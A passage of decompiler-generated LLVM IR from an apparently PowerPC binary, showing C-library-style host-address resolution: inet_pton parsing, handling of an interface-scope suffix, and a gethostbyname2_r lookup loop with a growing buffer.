  %v3_1001cbc0 = icmp eq i32 %v0_1001cbc0, 0
  %v2_1001cbc4 = load i32, i32* %stack_var_-208, align 4
  store i32 %v2_1001cbc4, i32* %r0.global-to-local, align 4
  store i32 %v2_1001cbc4, i32* %stack_var_-256, align 4
  br i1 %v3_1001cbc0, label %dec_label_pc_1001d06c, label %dec_label_pc_1001cbcc

dec_label_pc_1001cbcc:                            ; preds = %dec_label_pc_1001cbc0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_1001cbc0, i32* @r4, align 4
  %v2_1001cbdc = ptrtoint i32* %stack_var_-233 to i32
  store i32 %v2_1001cbdc, i32* %r11.global-to-local, align 4
  %v1_1001cbe0 = call i32 @__asm_rlwinm(i32 %v2_1001cbdc, i32 0, i32 0, i32 27)
  store i32 %v1_1001cbe0, i32* %r11.global-to-local, align 4
  store i32 %v1_1001cbe0, i32* %stack_var_-164, align 4
  %v0_1001cbe8 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001cbe8 = add i32 %v1_1001cbe0, 24
  %v3_1001cbe8 = inttoptr i32 %v2_1001cbe8 to i32*
  store i32 %v0_1001cbe8, i32* %v3_1001cbe8, align 4
  %v0_1001cbec = load i32, i32* %r0.global-to-local, align 4
  %v2_1001cbec = add i32 %v1_1001cbe0, 4
  %v3_1001cbec = inttoptr i32 %v2_1001cbec to i32*
  store i32 %v0_1001cbec, i32* %v3_1001cbec, align 4
  %v3_1001cbf0 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cbf0, i32* %r9.global-to-local, align 4
  %v0_1001cbf4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001cbf4 = inttoptr i32 %v3_1001cbf0 to i32*
  store i32 %v0_1001cbf4, i32* %v2_1001cbf4, align 4
  %v3_1001cbf8 = load i32, i32* %stack_var_-164, align 4
  %v1_1001cbfc = add i32 %v3_1001cbf8, 8
  store i32 %v1_1001cbfc, i32* @r5, align 4
  store i32 268553220, i32* @lr, align 4
  %v1_1001cc00 = call i32 @inet_pton(i32 %v1_1001cbfc)
  %tmp81 = icmp slt i32 %v1_1001cc00, 1
  br i1 %tmp81, label %dec_label_pc_1001cc34, label %dec_label_pc_1001cc0c

dec_label_pc_1001cc0c:                            ; preds = %dec_label_pc_1001cbcc
  %v0_1001cc0c = load i32, i32* @r27, align 4
  %v1_1001cc0c = add i32 %v0_1001cc0c, 4
  %v2_1001cc0c = inttoptr i32 %v1_1001cc0c to i32*
  %v3_1001cc0c = load i32, i32* %v2_1001cc0c, align 4
  store i32 %v3_1001cc0c, i32* %r0.global-to-local, align 4
  %v3_1001cc10 = icmp eq i32 %v3_1001cc0c, 0
  br i1 %v3_1001cc10, label %dec_label_pc_1001cc28, label %dec_label_pc_1001cc18

dec_label_pc_1001cc18:                            ; preds = %dec_label_pc_1001cc0c
  %v3_1001cc18 = icmp eq i32 %v3_1001cc0c, 2
  br i1 %v3_1001cc18, label %dec_label_pc_1001cc28, label %dec_label_pc_1001cc20

dec_label_pc_1001cc20:                            ; preds = %dec_label_pc_1001cc18
  %v0_1001cc20 = load i32, i32* @r21, align 4
  %v3_1001cc20 = icmp eq i32 %v0_1001cc20, 0
  br i1 %v3_1001cc20, label %dec_label_pc_1001d3c4, label %dec_label_pc_1001cc28

dec_label_pc_1001cc28:                            ; preds = %dec_label_pc_1001cc20, %dec_label_pc_1001cc18, %dec_label_pc_1001cc0c
  %v3_1001cc28 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cc28, i32* %r9.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1001cc30 = add i32 %v3_1001cc28, 4
  %v3_1001cc30 = inttoptr i32 %v2_1001cc30 to i32*
  store i32 2, i32* %v3_1001cc30, align 4
  br label %dec_label_pc_1001cc34

dec_label_pc_1001cc34:                            ; preds = %dec_label_pc_1001cbcc, %dec_label_pc_1001cc28
  %v3_1001cc34 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cc34, i32* %r9.global-to-local, align 4
  %v1_1001cc38 = add i32 %v3_1001cc34, 4
  %v2_1001cc38 = inttoptr i32 %v1_1001cc38 to i32*
  %v3_1001cc38 = load i32, i32* %v2_1001cc38, align 4
  store i32 %v3_1001cc38, i32* %r26.global-to-local, align 4
  %v3_1001cc3c = icmp eq i32 %v3_1001cc38, 0
  br i1 %v3_1001cc3c, label %dec_label_pc_1001cc44, label %dec_label_pc_1001cd4c

dec_label_pc_1001cc44:                            ; preds = %dec_label_pc_1001cc34
  %v0_1001cc44 = load i32, i32* @r24, align 4
  store i32 %v0_1001cc44, i32* @r3, align 4
  %v0_1001cc48 = call i32 @__GI_strlen()
  %v2_1001cc4c = load i32, i32* %stack_var_-256, align 4
  store i32 %v2_1001cc4c, i32* %r9.global-to-local, align 4
  %v1_1001cc50 = add i32 %v0_1001cc48, 31
  store i32 %v1_1001cc50, i32* %r0.global-to-local, align 4
  %v1_1001cc54 = add i32 %v0_1001cc48, 1
  store i32 %v1_1001cc54, i32* @r5, align 4
  %v1_1001cc58 = call i32 @__asm_rlwinm(i32 %v1_1001cc50, i32 0, i32 0, i32 27)
  %v0_1001cc5c = load i32, i32* @r24, align 4
  store i32 %v0_1001cc5c, i32* @r4, align 4
  %v1_1001cc60 = sub i32 0, %v1_1001cc58
  store i32 %v1_1001cc60, i32* %r0.global-to-local, align 4
  %v0_1001cc64 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001cc64 = load i32, i32* @r1, align 4
  %v3_1001cc64 = sub i32 %v1_1001cc64, %v1_1001cc58
  %v4_1001cc64 = inttoptr i32 %v3_1001cc64 to i32*
  store i32 %v0_1001cc64, i32* %v4_1001cc64, align 4
  %v1_1001cc68 = add i32 %v3_1001cc64, 23
  %v1_1001cc6c = call i32 @__asm_rlwinm(i32 %v1_1001cc68, i32 0, i32 0, i32 27)
  store i32 %v1_1001cc6c, i32* @r3, align 4
  store i32 268553332, i32* @lr, align 4
  %v0_1001cc70 = call i32 @memcpy()
  store i32 %v0_1001cc70, i32* @r3, align 4
  store i32 37, i32* %r4.global-to-local, align 4
  store i32 %v0_1001cc70, i32* %r30.global-to-local, align 4
  store i32 268553344, i32* @lr, align 4
  %v2_1001cc7c = call i32 @__GI_strchr(i32 37, i32 37)
  store i32 %v2_1001cc7c, i32* @r28, align 4
  %v4_1001cc80 = icmp eq i32 %v2_1001cc7c, 0
  %v0_1001cc84 = call i32 @__asm_mfcr()
  store i32 %v0_1001cc84, i32* %r29.global-to-local, align 4
  br i1 %v4_1001cc80, label %dec_label_pc_1001cc90, label %dec_label_pc_1001cc8c

dec_label_pc_1001cc8c:                            ; preds = %dec_label_pc_1001cc44
  %v0_1001cc8c = load i32, i32* %r26.global-to-local, align 4
  %v1_1001cc8c = trunc i32 %v0_1001cc8c to i8
  %v2_1001cc8c = load i32, i32* @r28, align 4
  %v3_1001cc8c = inttoptr i32 %v2_1001cc8c to i8*
  store i8 %v1_1001cc8c, i8* %v3_1001cc8c, align 1
  br label %dec_label_pc_1001cc90

dec_label_pc_1001cc90:                            ; preds = %dec_label_pc_1001cc44, %dec_label_pc_1001cc8c
  %v3_1001cc90 = load i32, i32* %stack_var_-164, align 4
  %v0_1001cc94 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1001cc94, i32* @r4, align 4
  %v1_1001cc9c = add i32 %v3_1001cc90, 8
  store i32 %v1_1001cc9c, i32* @r5, align 4
  store i32 268553380, i32* @lr, align 4
  %v3_1001cca0 = call i32 @inet_pton(i32 10)
  %tmp82 = icmp slt i32 %v3_1001cca0, 1
  br i1 %tmp82, label %dec_label_pc_1001cd4c, label %dec_label_pc_1001ccac

dec_label_pc_1001ccac:                            ; preds = %dec_label_pc_1001cc90
  %v0_1001ccac = load i32, i32* @r27, align 4
  %v1_1001ccac = add i32 %v0_1001ccac, 4
  %v2_1001ccac = inttoptr i32 %v1_1001ccac to i32*
  %v3_1001ccac = load i32, i32* %v2_1001ccac, align 4
  store i32 %v3_1001ccac, i32* %r0.global-to-local, align 4
  %v3_1001ccb0 = icmp eq i32 %v3_1001ccac, 0
  br i1 %v3_1001ccb0, label %dec_label_pc_1001ccc0, label %dec_label_pc_1001ccb8

dec_label_pc_1001ccb8:                            ; preds = %dec_label_pc_1001ccac
  %v3_1001ccb8 = icmp eq i32 %v3_1001ccac, 10
  br i1 %v3_1001ccb8, label %dec_label_pc_1001ccc0, label %dec_label_pc_1001d3c4

dec_label_pc_1001ccc0:                            ; preds = %dec_label_pc_1001ccb8, %dec_label_pc_1001ccac
  %v3_1001ccc0 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001ccc0, i32* %r9.global-to-local, align 4
  %v1_1001ccc4 = call %0 @__asm_mtcrf(i32 128, i32 %v0_1001cc84)
  %v4_1001ccc4 = extractvalue %0 %v1_1001ccc4, 2
  %v9_1001ccc4 = extractvalue %0 %v1_1001ccc4, 7
  store i4 %v9_1001ccc4, i4* @cr4, align 1
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_1001cccc = load i32, i32* %r9.global-to-local, align 4
  %v2_1001cccc = add i32 %v1_1001cccc, 4
  %v3_1001cccc = inttoptr i32 %v2_1001cccc to i32*
  store i32 10, i32* %v3_1001cccc, align 4
  br i1 %v4_1001ccc4, label %dec_label_pc_1001cd4c, label %dec_label_pc_1001ccd4

dec_label_pc_1001ccd4:                            ; preds = %dec_label_pc_1001ccc0
  %v3_1001ccd4 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001ccd4, i32* %r29.global-to-local, align 4
  store i32 -25165824, i32* %r9.global-to-local, align 4
  %v1_1001ccdc = add i32 %v3_1001ccd4, 8
  %v2_1001ccdc = inttoptr i32 %v1_1001ccdc to i32*
  %v3_1001ccdc = load i32, i32* %v2_1001ccdc, align 4
  store i32 %v3_1001ccdc, i32* %r0.global-to-local, align 4
  %v1_1001cce0 = call i32 @__asm_rlwinm(i32 %v3_1001ccdc, i32 0, i32 0, i32 9)
  store i32 %v1_1001cce0, i32* %r0.global-to-local, align 4
  %v1_1001cce4 = load i32, i32* %r9.global-to-local, align 4
  %v4_1001cce4 = icmp eq i32 %v1_1001cce0, %v1_1001cce4
  br i1 %v4_1001cce4, label %dec_label_pc_1001cd08, label %dec_label_pc_1001ccec

dec_label_pc_1001ccec:                            ; preds = %dec_label_pc_1001ccd4
  %v0_1001ccec = load i32, i32* %r29.global-to-local, align 4
  %v1_1001ccec = add i32 %v0_1001ccec, 8
  %v2_1001ccec = inttoptr i32 %v1_1001ccec to i8*
  %v3_1001ccec = load i8, i8* %v2_1001ccec, align 1
  %v4_1001ccec = zext i8 %v3_1001ccec to i32
  store i32 %v4_1001ccec, i32* %r0.global-to-local, align 4
  %v3_1001ccf0 = icmp eq i8 %v3_1001ccec, -1
  br i1 %v3_1001ccf0, label %dec_label_pc_1001ccf8, label %dec_label_pc_1001cd24

dec_label_pc_1001ccf8:                            ; preds = %dec_label_pc_1001ccec
  %v1_1001ccf8 = add i32 %v0_1001ccec, 9
  %v2_1001ccf8 = inttoptr i32 %v1_1001ccf8 to i8*
  %v3_1001ccf8 = load i8, i8* %v2_1001ccf8, align 1
  %tmp114 = urem i8 %v3_1001ccf8, 16
  %v1_1001ccfc = zext i8 %tmp114 to i32
  store i32 %v1_1001ccfc, i32* %r0.global-to-local, align 4
  %v3_1001cd00 = icmp eq i8 %tmp114, 2
  br i1 %v3_1001cd00, label %dec_label_pc_1001cd08, label %dec_label_pc_1001cd24

dec_label_pc_1001cd08:                            ; preds = %dec_label_pc_1001ccf8, %dec_label_pc_1001ccd4
  %v0_1001cd08 = load i32, i32* @r28, align 4
  %v1_1001cd08 = add i32 %v0_1001cd08, 1
  store i32 268553488, i32* @lr, align 4
  %v1_1001cd0c = call i32 @__GI_if_nametoindex(i32 %v1_1001cd08)
  %v1_1001cd10 = load i32, i32* @r29, align 4
  %v2_1001cd10 = add i32 %v1_1001cd10, 24
  %v3_1001cd10 = inttoptr i32 %v2_1001cd10 to i32*
  store i32 %v1_1001cd0c, i32* %v3_1001cd10, align 4
  %v3_1001cd14 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cd14, i32* %r9.global-to-local, align 4
  %v1_1001cd18 = add i32 %v3_1001cd14, 24
  %v2_1001cd18 = inttoptr i32 %v1_1001cd18 to i32*
  %v3_1001cd18 = load i32, i32* %v2_1001cd18, align 4
  store i32 %v3_1001cd18, i32* %r0.global-to-local, align 4
  %v3_1001cd1c = icmp eq i32 %v3_1001cd18, 0
  br i1 %v3_1001cd1c, label %dec_label_pc_1001cd24, label %dec_label_pc_1001cd4c

dec_label_pc_1001cd24:                            ; preds = %dec_label_pc_1001cd08, %dec_label_pc_1001ccf8, %dec_label_pc_1001ccec
  %v3_1001cd24 = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cd24, i32* @r29, align 4
  %v0_1001cd28 = load i32, i32* @r28, align 4
  %v1_1001cd28 = add i32 %v0_1001cd28, 1
  %v2_1001cd2c = ptrtoint i8** %stack_var_-156 to i32
  store i32 %v2_1001cd2c, i32* @r4, align 4
  store i32 10, i32* @r5, align 4
  store i32 268553528, i32* @lr, align 4
  %v3_1001cd34 = call i32 @strtoul(i32 %v1_1001cd28, i32 %v2_1001cd2c, i32 10)
  %v1_1001cd38 = load i32, i32* @r29, align 4
  %v2_1001cd38 = add i32 %v1_1001cd38, 24
  %v3_1001cd38 = inttoptr i32 %v2_1001cd38 to i32*
  store i32 %v3_1001cd34, i32* %v3_1001cd38, align 4
  %v3_1001cd3c = load i8*, i8** %stack_var_-156, align 4
  %v4_1001cd3c = ptrtoint i8* %v3_1001cd3c to i32
  store i32 %v4_1001cd3c, i32* %r9.global-to-local, align 4
  %v2_1001cd40 = load i8, i8* %v3_1001cd3c, align 1
  %v3_1001cd40 = zext i8 %v2_1001cd40 to i32
  store i32 %v3_1001cd40, i32* %r0.global-to-local, align 4
  %v3_1001cd44 = icmp eq i8 %v2_1001cd40, 0
  br i1 %v3_1001cd44, label %dec_label_pc_1001cd4c, label %dec_label_pc_1001d3cc

dec_label_pc_1001cd4c:                            ; preds = %dec_label_pc_1001cd24, %dec_label_pc_1001cd08, %dec_label_pc_1001cc34, %dec_label_pc_1001ccc0, %dec_label_pc_1001cc90
  %v3_1001cd4c = load i32, i32* %stack_var_-164, align 4
  store i32 %v3_1001cd4c, i32* %r9.global-to-local, align 4
  %v1_1001cd50 = add i32 %v3_1001cd4c, 4
  %v2_1001cd50 = inttoptr i32 %v1_1001cd50 to i32*
  %v3_1001cd50 = load i32, i32* %v2_1001cd50, align 4
  store i32 %v3_1001cd50, i32* %r0.global-to-local, align 4
  %v3_1001cd54 = icmp eq i32 %v3_1001cd50, 0
  br i1 %v3_1001cd54, label %dec_label_pc_1001cd5c, label %dec_label_pc_1001d058

dec_label_pc_1001cd5c:                            ; preds = %dec_label_pc_1001cd4c
  %v0_1001cd5c = load i32, i32* @r27, align 4
  %v1_1001cd5c = inttoptr i32 %v0_1001cd5c to i32*
  %v2_1001cd5c = load i32, i32* %v1_1001cd5c, align 4
  store i32 %v2_1001cd5c, i32* %r0.global-to-local, align 4
  %v1_1001cd60 = and i32 %v2_1001cd5c, 4
  store i32 %v1_1001cd60, i32* %r9.global-to-local, align 4
  %v3_1001cd60 = icmp eq i32 %v1_1001cd60, 0
  br i1 %v3_1001cd60, label %dec_label_pc_1001cd68, label %dec_label_pc_1001d058

dec_label_pc_1001cd68:                            ; preds = %dec_label_pc_1001cd5c
  %v1_1001cd68 = add i32 %v0_1001cd5c, 4
  %v2_1001cd68 = inttoptr i32 %v1_1001cd68 to i32*
  %v3_1001cd68 = load i32, i32* %v2_1001cd68, align 4
  store i32 %v3_1001cd68, i32* %r0.global-to-local, align 4
  %v3_1001cd6c = icmp eq i32 %v3_1001cd68, 0
  br i1 %v3_1001cd6c, label %dec_label_pc_1001cd74, label %dec_label_pc_1001cd7c

dec_label_pc_1001cd74:                            ; preds = %dec_label_pc_1001cd7c, %dec_label_pc_1001cd68
  store i32 512, i32* %r30.global-to-local, align 4
  %v2_1001cdac = ptrtoint i32* %stack_var_-136 to i32
  %v2_1001cdb8 = ptrtoint i8** %stack_var_-156 to i32
  %v2_1001cdbc = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_1001cd90

dec_label_pc_1001cd7c:                            ; preds = %dec_label_pc_1001cd68
  %v3_1001cd7c = icmp eq i32 %v3_1001cd68, 10
  %v2_1001cd80 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1001cd80, i32* @r28, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br i1 %v3_1001cd7c, label %dec_label_pc_1001cd74, label %dec_label_pc_1001cec4

dec_label_pc_1001cd90:                            ; preds = %dec_label_pc_1001cdd4.dec_label_pc_1001cd90_crit_edge, %dec_label_pc_1001cd74
  %v0_1001cd90 = phi i32 [ %v0_1001cd90.pre, %dec_label_pc_1001cdd4.dec_label_pc_1001cd90_crit_edge ], [ 512, %dec_label_pc_1001cd74 ]
  %v1_1001cd90 = mul i32 %v0_1001cd90, 2
  store i32 %v1_1001cd90, i32* %r30.global-to-local, align 4
  %v2_1001cd94 = load i32, i32* %stack_var_-256, align 4
  store i32 %v2_1001cd94, i32* %r9.global-to-local, align 4
  %v1_1001cd98 = add i32 %v1_1001cd90, 30
  store i32 %v1_1001cd98, i32* %r0.global-to-local, align 4
  %v1_1001cda0 = call i32 @__asm_rlwinm(i32 %v1_1001cd98, i32 0, i32 0, i32 27)
  store i32 10, i32* @r4, align 4
  %v1_1001cda8 = sub i32 0, %v1_1001cda0
  store i32 %v1_1001cda8, i32* %r0.global-to-local, align 4
  store i32 %v2_1001cdac, i32* @r5, align 4
  %v0_1001cdb0 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001cdb0 = load i32, i32* @r1, align 4
  %v3_1001cdb0 = sub i32 %v1_1001cdb0, %v1_1001cda0
  %v4_1001cdb0 = inttoptr i32 %v3_1001cdb0 to i32*
  store i32 %v0_1001cdb0, i32* %v4_1001cdb0, align 4
  %v0_1001cdb4 = load i32, i32* %r30.global-to-local, align 4
  store i32 %v0_1001cdb4, i32* @r7, align 4
  store i32 %v2_1001cdb8, i32* @r8, align 4
  store i32 %v2_1001cdbc, i32* @r9, align 4
  %v1_1001cdc0 = add i32 %v3_1001cdb0, 23
  %v1_1001cdc4 = call i32 @__asm_rlwinm(i32 %v1_1001cdc0, i32 0, i32 0, i32 27)
  store i32 %v1_1001cdc4, i32* @r6, align 4
  store i32 268553676, i32* @lr, align 4
  %v1_1001cdc8 = call i32 @gethostbyname2_r(i32 %v1_1001cdc4)
  %v3_1001cdcc = icmp eq i32 %v1_1001cdc8, 34
  br i1 %v3_1001cdcc, label %dec_label_pc_1001cdd4, label %dec_label_pc_1001cde4

dec_label_pc_1001cdd4:                            ; preds = %dec_label_pc_1001cd90
  %v3_1001cdd4 = load i32, i32* %stack_var_-160, align 4
  store i32 %v3_1001cdd4, i32* %r0.global-to-local, align 4
  %v3_1001cdd8 = icmp eq i32 %v3_1001cdd4, -1
  br i1 %v3_1001cdd8, label %dec_label_pc_1001cdd4.dec_label_pc_1001cd90_crit_edge, label %dec_label_pc_1001cdec

dec_label_pc_1001cdd4.dec_label_pc_1001cd90_crit_edge: ; preds = %dec_label_pc_1001cdd4
  %v0_1001cd90.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1001cd90

dec_label_pc_1001cde4:                            ; preds = %dec_label_pc_1001cd90
  %v3_1001cde4 = icmp eq i32 %v1_1001cdc8, 0
  br i1 %v3_1001cde4, label %dec_label_pc_1001ce24, label %dec_label_pc_1001cde4.dec_label_pc_1001cdec_crit_edge

dec_label_pc_1001cde4.dec_label_pc_1001cdec_crit_edge: ; preds = %dec_label_pc_1001cde4
  %v3_1001cdec.pre = load i32, i32* %stack_var_-160, align 4
  br label %dec_label_pc_1001cdec

dec_label_pc_1001cdec:                            ; preds = %dec_label_pc_1001cdd4, %dec_label_pc_1001cde4.dec_label_pc_1001cdec_crit_edge
  %v0_1001ce10 = phi i32 [ %v3_1001cdec.pre, %dec_label_pc_1001cde4.dec_label_pc_1001cdec_crit_edge ], [ %v3_1001cdd4, %dec_label_pc_1001cdd4 ]
  store i32 %v0_1001ce10, i32* %r29.global-to-local, align 4
  %v3_1001cdf0 = icmp eq i32 %v0_1001ce10, -1
  br i1 %v3_1001cdf0, label %dec_label_pc_1001cf6c, label %dec_label_pc_1001cdf8

dec_label_pc_1001cdf8:                            ; preds = %dec_label_pc_1001cdec
  %v3_1001cdf8 = icmp eq i32 %v0_1001ce10, 2
  %v2_1001cdfc = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1001cdfc, i32* @r28, align 4
  br i1 %v3_1001cdf8, label %dec_label_pc_1001ce04, label %dec_label_pc_1001ce10

dec_label_pc_1001ce04:                            ; preds = %dec_label_pc_1001cdf8
  store i32 -3, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001cec4

dec_label_pc_1001ce10:                            ; preds = %dec_label_pc_1001cdf8
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001cec4

dec_label_pc_1001ce24:                            ; preds = %dec_label_pc_1001cde4
  %v3_1001ce24 = load i8*, i8** %stack_var_-156, align 4
  %v4_1001ce24 = ptrtoint i8* %v3_1001ce24 to i32
  store i32 %v4_1001ce24, i32* %r0.global-to-local, align 4
  %v2_1001ce28 = ptrtoint i32* %stack_var_-164 to i32
  store i32 %v2_1001ce28, i32* @r28, align 4
  %v3_1001ce30 = icmp eq i8* %v3_1001ce24, null
  br i1 %v3_1001ce30, label %dec_label_pc_1001cec0, label %dec_label_pc_1001ce38

dec_label_pc_1001ce38:                            ; preds = %dec_label_pc_1001ce24
  store i32 %v2_1001ce28, i32* @r28, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001cea0

dec_label_pc_1001ce44:                            ; preds = %dec_label_pc_1001cea0
  %v1_1001ce44 = inttoptr i32 %v0_1001ce44 to i32*
  %v2_1001ce44 = load i32, i32* %v1_1001ce44, align 4
  store i32 %v2_1001ce44, i32* %r11.global-to-local, align 4
  %v3_1001ce48 = icmp eq i32 %v2_1001ce44, 0
  br i1 %v3_1001ce48, label %dec_label_pc_1001ce50, label %dec_label_pc_1001ce6c

dec_label_pc_1001ce50:                            ; preds = %dec_label_pc_1001ce44
  %v0_1001ce50 = load i32, i32* @r1, align 4
  %v1_1001ce50 = inttoptr i32 %v0_1001ce50 to i32*
  %v2_1001ce50 = load i32, i32* %v1_1001ce50, align 4
  %v2_1001ce54 = add i32 %v0_1001ce50, -48
  %v3_1001ce54 = inttoptr i32 %v2_1001ce54 to i32*
  store i32 %v2_1001ce50, i32* %v3_1001ce54, align 4
  %v1_1001ce58 = add i32 %v0_1001ce50, -25
  store i32 %v1_1001ce58, i32* %r0.global-to-local, align 4
  %v1_1001ce5c = call i32 @__asm_rlwinm(i32 %v1_1001ce58, i32 0, i32 0, i32 27)
  store i32 %v1_1001ce5c, i32* %r0.global-to-local, align 4
  store i32 %v1_1001ce5c, i32* %r9.global-to-local, align 4
  %v1_1001ce64 = load i32, i32* @r28, align 4
  %v2_1001ce64 = inttoptr i32 %v1_1001ce64 to i32*
  store i32 %v1_1001ce5c, i32* %v2_1001ce64, align 4
  %v0_1001ce68 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001ce68 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001ce68 = add i32 %v1_1001ce68, 24
  %v3_1001ce68 = inttoptr i32 %v2_1001ce68 to i32*
  store i32 %v0_1001ce68, i32* %v3_1001ce68, align 4
  %v0_1001ce6c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_1001ce6c

dec_label_pc_1001ce6c:                            ; preds = %dec_label_pc_1001ce44, %dec_label_pc_1001ce50
  %v0_1001ce6c = phi i32 [ %v0_1001ce44, %dec_label_pc_1001ce44 ], [ %v0_1001ce6c.pre, %dec_label_pc_1001ce50 ]
  %v1_1001ce6c = inttoptr i32 %v0_1001ce6c to i32*
  %v2_1001ce6c = load i32, i32* %v1_1001ce6c, align 4
  store i32 %v2_1001ce6c, i32* %r9.global-to-local, align 4
  %v2_1001ce74 = inttoptr i32 %v2_1001ce6c to i32*
  store i32 0, i32* %v2_1001ce74, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_1001ce7c = load i32, i32* @r28, align 4
  %v1_1001ce7c = inttoptr i32 %v0_1001ce7c to i32*
  %v2_1001ce7c = load i32, i32* %v1_1001ce7c, align 4
  %v2_1001ce80 = add i32 %v2_1001ce7c, 4
  %v3_1001ce80 = inttoptr i32 %v2_1001ce80 to i32*
  store i32 10, i32* %v3_1001ce80, align 4
  %v3_1001ce84 = load i8*, i8** %stack_var_-156, align 4
  %v4_1001ce84 = ptrtoint i8* %v3_1001ce84 to i32
  store i32 %v4_1001ce84, i32* %r9.global-to-local, align 4
  %v0_1001ce88 = load i32, i32* @r28, align 4
  %v1_1001ce88 = inttoptr i32 %v0_1001ce88 to i32*
  %v2_1001ce88 = load i32, i32* %v1_1001ce88, align 4
  %v1_1001ce8c = add i32 %v4_1001ce84, 16
  %v2_1001ce8c = inttoptr i32 %v1_1001ce8c to i32*
  %v3_1001ce8c = load i32, i32* %v2_1001ce8c, align 4
  store i32 %v3_1001ce8c, i32* %r9.global-to-local, align 4
  %v1_1001ce90 = add i32 %v2_1001ce88, 8
  store i32 %v1_1001ce90, i32* @r3, align 4
  %v1_1001ce94 = load i32, i32* @r10, align 4
  %v2_1001ce94 = add i32 %v1_1001ce94, %v3_1001ce8c
  %v3_1001ce94 = inttoptr i32 %v2_1001ce94 to i32*
  %v4_1001ce94 = load i32, i32* %v3_1001ce94, align 4
  store i32 %v4_1001ce94, i32* @r4, align 4
  store i32 268553884, i32* @lr, align 4
  %v0_1001ce98 = call i32 @memcpy()
  %v0_1001ce9c = load i32, i32* @r28, align 4
  %v1_1001ce9c = inttoptr i32 %v0_1001ce9c to i32*
  %v2_1001ce9c = load i32, i32* %v1_1001ce9c, align 4
  store i32 %v2_1001ce9c, i32* @r28, align 4
  %v3_1001cea0.pre = load i8*, i8** %stack_var_-156, align 4
  %v0_1001cea4.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001cea0

dec_label_pc_1001cea0:                            ; preds = %dec_label_pc_1001ce38, %dec_label_pc_1001ce6c
  %v0_1001ce44 = phi i32 [ %v2_1001ce28, %dec_label_pc_1001ce38 ], [ %v2_1001ce9c, %dec_label_pc_1001ce6c ]
  %v0_1001cea4 = phi i32 [ 0, %dec_label_pc_1001ce38 ], [ %v0_1001cea4.pre, %dec_label_pc_1001ce6c ]
  %v3_1001cea0 = phi i8* [ %v3_1001ce24, %dec_label_pc_1001ce38 ], [ %v3_1001cea0.pre, %dec_label_pc_1001ce6c ]
  %v4_1001cea0 = ptrtoint i8* %v3_1001cea0 to i32
  store i32 %v4_1001cea0, i32* %r9.global-to-local, align 4
  %v1_1001cea4 = mul i32 %v0_1001cea4, 4
  store i32 %v1_1001cea4, i32* @r10, align 4
  store i32 16, i32* @r5, align 4
  %v1_1001ceac = add i32 %v0_1001cea4, 1
  store i32 %v1_1001ceac, i32* %r30.global-to-local, align 4
  %v1_1001ceb0 = add i32 %v4_1001cea0, 16
  %v2_1001ceb0 = inttoptr i32 %v1_1001ceb0 to i32*
  %v3_1001ceb0 = load i32, i32* %v2_1001ceb0, align 4
  store i32 %v3_1001ceb0, i32* %r9.global-to-local, align 4
  %v2_1001ceb4 = add i32 %v3_1001ceb0, %v1_1001cea4
  %v3_1001ceb4 = inttoptr i32 %v2_1001ceb4 to i32*
  %v4_1001ceb4 = load i32, i32* %v3_1001ceb4, align 4
  store i32 %v4_1001ceb4, i32* %r0.global-to-local, align 4
  %v3_1001ceb8 = icmp eq i32 %v4_1001ceb4, 0
  br i1 %v3_1001ceb8, label %dec_label_pc_1001cec0, label %dec_label_pc_1001ce44

dec_label_pc_1001cec0:                            ; preds = %dec_label_pc_1001cea0, %dec_label_pc_1001ce24
  store i32 0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001cec4

dec_label_pc_1001cec4:                            ; preds = %dec_label_pc_1001cd7c, %dec_label_pc_1001ce10, %dec_label_pc_1001ce04, %dec_label_pc_1001cec0
  %v0_1001d02c = phi i32 [ 0, %dec_label_pc_1001cd7c ], [ 0, %dec_label_pc_1001ce10 ], [ -3, %dec_label_pc_1001ce04 ], [ 0, %dec_label_pc_1001cec0 ]
  %v0_1001cec4 = load i32, i32* @r27, align 4
  %v1_1001cec4 = add i32 %v0_1001cec4, 4
  %v2_1001cec4 = inttoptr i32 %v1_1001cec4 to i32*
  %v3_1001cec4 = load i32, i32* %v2_1001cec4, align 4
  store i32 %v3_1001cec4, i32* %r0.global-to-local, align 4
  %v3_1001cec8 = icmp eq i32 %v3_1001cec4, 2
  br i1 %v3_1001cec8, label %dec_label_pc_1001ceec, label %dec_label_pc_1001ced0

dec_label_pc_1001ced0:                            ; preds = %dec_label_pc_1001cec4
  %v0_1001ced0 = load i32, i32* @r21, align 4
  %v3_1001ced0 = icmp eq i32 %v0_1001ced0, 0
  br i1 %v3_1001ced0, label %dec_label_pc_1001ced8, label %dec_label_pc_1001cee4

dec_label_pc_1001ced8:                            ; preds = %dec_label_pc_1001ced0
  %v3_1001ced8 = icmp eq i32 %v3_1001cec4, 0
  br i1 %v3_1001ced8, label %dec_label_pc_1001ceec, label %dec_label_pc_1001d030

dec_label_pc_1001cee4:                            ; preds = %dec_label_pc_1001ced0
  %v3_1001cee4 = icmp eq i32 %v0_1001d02c, 0
